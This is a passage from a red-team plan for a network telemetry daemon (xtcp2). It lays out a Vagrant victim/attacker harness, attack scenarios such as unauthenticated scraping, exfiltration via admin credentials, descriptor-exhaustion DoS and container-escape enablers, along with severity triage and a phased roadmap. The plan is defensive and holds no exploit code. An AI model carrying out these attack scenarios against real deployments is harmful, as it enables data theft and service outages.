by default, stream auth at start only, link-monitor panic isolation. New
ground this family probes: whether listener FD exhaustion degrades *collection*,
whether scrape-slot starvation defeats read-auth, coverage lag under dump
amplification, and netns-entry poisoning on Docker.

## Vagrant harness design

Layout in-repo (shared with the TODO-SOON §29 Ubuntu boxes — one base, two
suites):

```text
vagrant/
  README.md                  # how to run, prerequisites (libvirt, vagrant, nix build of the image)
  base/                      # Vagrantfile base: ubuntu/noble64 (24.04) + jammy (22.04) boxes, libvirt provider
  provision/
    victim.sh                # docker-ce install, load oci-xtcp2 tarball, compose daemon (env matrix below)
    attacker.sh               # attack tools: slowhttptest, h2load, ghz, grpcurl(repo), socat, jq, tcpdump, strace
  redteam/
    Vagrantfile              # victim VM + attacker VM (separate libvirt net) + optional catcher
    scenarios/
      rt-1-1-unauth-scrape.sh
      rt-2-3-auth-mode-confusion.sh
      ...
    lib/
      assert.sh              # expect-style helpers, TTL/packet assertions, metric greps
    findings.md              # triage log (outcome taxonomy per scenario)
  ubuntu-fleet/              # (§29 boxes, later: link-monitor baseline rows — not this plan's deliverable)
```

Topology:

```text
libvirt net "mgmt" ── victim VM (ubuntu 24.04)
│                    ├─ xtcp2 container (--network host | bridge variant)
│                    ├─ co-tenant attacker container (same bridge)
│                    ├─ catcher (socat/HTTP sink + kafka fake)
│                    └─ churn driver (nsTest, tcp_server/tcp_client population)
└── attacker VM (ubuntu 24.04, 1 hop away; routed variant adds hops)
```

Runner contract (every scenario script):

1. Idempotent `up` + provision; scenario may pass `XTCP2_MODE` env selecting
   the deployment matrix row: `{host,bridge} × {auth-off, raw, hmac} ×
   {priv, min-caps}`.
2. Execute attack from the designated vantage (co-tenant / attacker VM / VM
   host).
3. Emit TAP-ish output: `ok/not-ok rt-N-M <assertion>` lines, plus a machine
   readable summary line `RESULT rt-N-M CONFIRMED|MITIGATED|BLOCKED|NA`.
4. Never leave the victim wedged: teardown or reset per scenario.
5. Findings append to `vagrant/redteam/findings.md` with severity, evidence
   (command + captured bytes path), and issue link.

Prerequisites on `l`: `vagrant` + `vagrant-libvirt` plugin (provided through
the Nix dev shell), KVM, and the OCI image tarball built via
`nix build .#oci-xtcp2`. Nested virtualization is not required (boxes run
Docker natively).

## Flake and Makefile integration

Following TODO-SOON §29's convention of Vagrant suites as flake apps:

- `apps.x86_64-linux.redteam-<scenario>` → `vagrant/redteam/scenarios/<script>`
  (Vagrantfile-driven, uses dev shell's vagrant).
- `apps.x86_64-linux.redteam-matrix` → full sweep of one row group.
- `make redteam-lint` (shellcheck on scenario scripts) and a `make redteam-smoke`
  that runs rt-1-1 only, for CI triage.
- Scenario outcomes are **not** registered flake checks initially: several
  scenarios intentionally assert documented-broken behavior (rt-2-3, rt-4-1,
   rt-6-2) and would gate on findings, not regressions. Once a finding is
  fixed, its scenario flips to a regression gate (see triage below).

## Severity and triage conventions

Outcome per scenario:

| Outcome | Meaning | Follow-up |
|---|---|---|
| CONFIRMED | attack succeeds, no mitigation | fix issue + regression test; deploy guidance update |
| MITIGATED | succeeds but bounded/detected as designed | document + keep scenario as regression gate |
| BLOCKED | protection holds | keep as regression gate |
| NA | deployment row not applicable | note in findings.md |

Severity scale (impact on the Ubuntu host / fleet):

- **S1** — host compromise or host-wide DoS via xtcp2 (e.g., netlink write
  found, privileged-container escape enabler).
- **S2** — unauthenticated data exfiltration (socket records, secrets), daemon
  OOM/fd exhaustion with default config, admin-level exfil via inherited creds.
- **S3** — authenticated/admin-required abuse, bounded DoS, guidance gaps,
  footguns with documented workarounds.
- **S4** — recon, regression coverage, hygiene.

## Phased roadmap

| Phase | Scope | Scenarios | Exit criteria |
|---|---|---|---|
| 0 | Harness bootstrap: Vagrantfile, provisioning, image load, deployment-matrix env, flake app wrap, rt-1-1 | rt-1-1 | one-command run on `l` produces RESULT line |
| 1 | Default-exposure sweep | rt-1-*, rt-9-1, rt-9-5, rt-11-1..4 (plain tier) | exposure matrix documented; findings filed |
| 2 | Auth-on matrix | rt-2-*, rt-9-2, rt-9-3, rt-11-1..3 (read-cred tier) | every documented limitation re-tested on Ubuntu/Docker; auth-mode confusion issue filed |
| 3 | Admin abuse | rt-3-*, rt-7-1..3, rt-11 tier 4 rows | exfil and `dest: null` blind chains demonstrated end-to-end with detection gap notes |
| 4 | DoS suite | rt-4-1..8, rt-11-4..8 | connection-exhaustion measured (rt-4-1) and issue filed to wire limits |
| 5 | Host assurance | rt-5-*, rt-6-*, rt-9-4, rt-11-9..13 | netlink write audit clean on Ubuntu 6.8 + 5.15; cap matrix produced; blind-detection runbook written |
| 6 | Parser/fuzz | rt-8-1..4 | hostile-netns harness reusable; fuzz campaigns green |
| 7 | Triage & close-out | all | findings.md complete; fixes or issues for every CONFIRMED; regression gates registered; security.md updated with Ubuntu/Docker specifics |

Phase 0–1 is the first PR: `vagrant/` + `docs/redteam-plan.md` + one green
scenario. Each later phase is its own PR.

## Deliverables and success criteria

1. This plan (doc), reviewed.
2. `vagrant/` harness with the deployment matrix and ≥10 automated scenarios
   across RT-1..RT-9, each emitting pass/fail + outcome taxonomy.
3. `findings.md` with evidence for every CONFIRMED, and linked issues/fixes.
4. Regression gates for everything that is MITIGATED/BLOCKED (these graduate
   into flake checks or the §29 Ubuntu suite).
5. Updated `docs/security.md` with an Ubuntu/Docker deployment section:
   host-network-mode exposure, cap matrix, egress restriction requirement,
   UDS dir ownership, secret-file modes.
6. A **blind-detection runbook** for RT-11: per cut link, the metric/log that
   reveals it; missing gauges (e.g. process FD usage, per-namespace coverage
   lag) filed as observability issues; external-watchdog requirement
   documented.
7. A govulncheck flake check (rt-7-4).
8. Answer to the ops question, written down: xtcp2 itself sends no
   netlink writes (rt-5-1 evidence), and the privileged-container blast
   radius is documented with a minimum-cap recipe (rt-5-3/4).

Success = a maintainer or auditor can reproduce every finding with one command
from a clean checkout, and every finding is either fixed or has an open issue
with a documented interim mitigation.

## Out of scope

- Attacking the data plane beyond the daemon's egress (ClickHouse, Kafka
  brokers, Grafana) — separate program.
- CI fuzzing of the whole kernel netlink surface (extend existing targets
  instead).
- Supply-chain integrity of the Nix build itself (trusted inputs, `nix path-info`).
- Physical/L2 attacks other than the `route_localnet` case.
- Social engineering / runpod fleet infrastructure compromise (A5 poisoner is
  in scope only via the artifact paths the daemon itself ingests).
